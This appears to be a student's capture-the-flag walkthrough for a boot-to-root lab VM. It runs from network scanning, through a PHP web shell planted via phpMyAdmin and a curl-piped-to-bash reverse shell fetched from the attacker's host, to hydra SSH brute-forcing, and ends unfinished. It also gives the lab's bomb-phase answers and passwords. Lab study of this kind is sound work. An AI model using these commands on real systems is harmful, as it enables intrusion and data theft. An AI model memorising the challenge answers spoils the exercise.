```ifconfig```
    *to get our IP*

```nmap -sn -T4 <Network>```
    *pings every IP address of the network*

```ping <TargetIP>```
    *to get more info on the IP found*
    ttl = 64 -> Linux

```nmap -sVC -p- -T4 <TargetIP>```
    *scans every possible port (65535)*
    21 ftp, 22 ssh, 80 http, 143 imap, 443 https, 993 ssl/imap
    couldn't do anything with ftp, http and ssh

```dirb https://<TargetIP>```
    *using a wordlist, sends requests to the server to find existing endpoints*
    found directories : forum, phpmyadmin and webmail

```https://<TargetIP>/forum```
    logs file -> found a password of unknown user -> next successful login by lmezard

```Connection in the forum as lmezard```
    In "Edit profile" : user email : laurie@borntosec.net

```https://<TargetIP>/webmail```
    Logged in as laurie@borntosec.net -> access to the user's mails -> in "DB Access", root:<passwd>

```https://<TargetIP>/phpmyadmin```
    Connection as root
    
```SELECT "<?php system($_GET['cmd']) ?>" INTO OUTFILE '/var/www/forum/templates_c/rce.php';```
    *allows remote code execution (RCE)*

```echo "<reverse shell>" > shell.sh```
    *reverse shell script to execute*

```nc -nlvp <reverse shell port>```
    *opening a listening port*

```python3 -m http.server 80```
    *hosts shell.sh on port 80*

```https://<TargetIP>/forum/templates_c/rce.php?cmd=curl <LocalIP>/shell.sh | bash```
    *executes our reverse shell*

```python -c 'import pty;pty.spawn("/bin/bash")'``` ; ```^Z``` ; ```stty -echo raw;fg``` 
    *upgrade our reverse shell*

```cat /home/LOOKATME/password```
    Found a password for lmezard

```su lmezard```
    Connection as lmezard

Solving "fun" to get laurie's password
    ```tar -xvf ./fun```
    ```cat ft_fun/* | grep printf | grep -v haha``` -> password is 12 chars long
    ```cat ft_fun/* | grep getme -A 3 | grep -v haha``` -> password ending in "wnage"
    ```cat ft_fun/* | grep return | grep -v haha``` -> the characters left to order are "eptharI"
    ```python3 laurie.py | awk '{print $5}' > laurie_passwd.txt``` -> generate every possible permutation with those characters
    ```hydra -l laurie -P ./laurie_passwd.txt <TargetIP> ssh -v``` -> try every hashed possible password thanks to hydra -> connection as laurie
    -> laurie:<sha256 of "Iheartpwnage">

/home/laurie/README gives us hints to defuse the bomb
We could understand the code by decompiling the binary

Every phase waits for a user input, if incorrect, the bomb explodes

Phase 1 : compares the input with the string "Public speaking is very easy." -> input : "Public speaking is very easy."
Phase 2 : takes 6 numbers as input, input[i + 1] = input[i] * (input[i] + 1), with 1 as input[0] -> input : "1 2 6 24 120 720"
Phase 3 : takes a combination of one number, one char and another number. 7 combinations work, but thanks to the hints, we can keep only 3 of them : "1 b 214 / 2 b 755 / 7 b 524" -> input : "1 b 214"
Phase 4 : one number expected, > 0. Brute forcing it, we got "9"
Phase 5 : receives a string, applies an algorithm on every character. The result should be equal to "giants". Testing every letter, we got -> input : "opekmq" (or opekma)
Phase 6 : receives 6 numbers. Each one should be between 0 and 6, and 2 consecutive numbers can't be equal. Knowing that, we could brute force the password -> input : "4 2 6 3 1 5"

Secret phase : can be accessed by adding "austinpowers" to the fourth input -> "9 austinpowers". Receives a number > 0 and <= 1001. By brute force (again) -> input : "1001"

```cat phases_passwords.txt | tr -d ' \n'; echo```
    *Joins the password of every level to get the ssh psswd for "thor"*
    -> Publicspeakingisveryeasy.126241207201b2149opekmq426315 
        -> doesn't work. After reading carefully the subject, we need to swap "3" and "1" on phase 6
        -> thor:<Publicspeakingisveryeasy.126241207201b2149opekmq426135>


/home/thor/README tells us to use the result of the challenge "turtle" as password for "zaz"

In "turtle" we find instructions in French seeming to describe a path. Drawing it on paper, we end up writting "SLASH"
We have to "digest" the password to use it, and thus apply md5 (message digest) on "SLASH"
    ```echo -n "SLASH" | md5sum```
    -> zaz:<646da671ca01bb5d84dbb5fb2238dc8e>


We now have to exploit /home/zaz/exploit_me, which is a simple binary containing the c function "strcpy"


TO FINISH